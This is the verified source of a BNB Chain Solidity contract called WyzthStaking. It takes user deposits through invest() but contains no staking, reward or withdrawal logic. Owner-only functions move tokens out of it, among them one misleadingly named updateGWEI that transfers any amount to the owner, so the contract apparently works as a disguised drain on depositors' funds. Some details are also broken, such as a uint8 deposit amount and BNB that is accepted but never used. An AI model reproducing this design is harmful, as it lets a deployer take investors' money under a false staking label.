/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

pragma solidity ^0.5.4;
// SPDX-License-Identifier: MIT

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function burn(uint256 value) external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract WyzthStaking  {
     using SafeMath for uint256;
     
  
    struct User {
        uint id;
     }
    
  
    // mapping(address => address[]) public downlines;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
      
    uint public lastUserId = 2;
       
    address public owner; 
    address public adminWallet; 
   
    event Registration(address indexed user);
    event Investment(address indexed user, uint256 package);
    IERC20 private COIN; 
   
    constructor(address ownerAddress,address adminAddress, IERC20 _COIN) public 
    {
        owner = ownerAddress;
        adminWallet=adminAddress;
        COIN = _COIN;
        User memory user = User({
            id: 1
           });
              
        
    } 
   
    function registration(address userAddress) private 
    {
        User memory user = User({
            id: lastUserId
        });
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        lastUserId++;
        emit Registration(userAddress);
    
    }
    
   
    function invest(address userAddress, uint8 package) public payable 
    {
        if(!isUserExists(userAddress))
        {
            registration(userAddress);
        }
        COIN.transferFrom(msg.sender,address(this),package);
        emit Investment(msg.sender, package);
     
    }

 
	
    function isContract(address _address) public view returns (bool _isContract)
    {
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }   
   
      
    function isUserExists(address user) public view returns (bool) 
    {
        return (users[user].id != 0);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
      function multisend(address payable[]  memory  _contributors, uint256[] memory _balances,IERC20 _token) public payable 
     {
        require(msg.sender==owner,"Only Owner");
        uint256 i = 0;
        for (i; i < _contributors.length; i++) 
        {
            _token.transfer(_contributors[i],_balances[i]);
        }
    }
    
     function updateGWEI(uint256 tokeQty,IERC20 _token) public payable 
     {
        require(msg.sender==owner,"Only Owner");
        _token.transfer(owner,tokeQty);
    }
  
}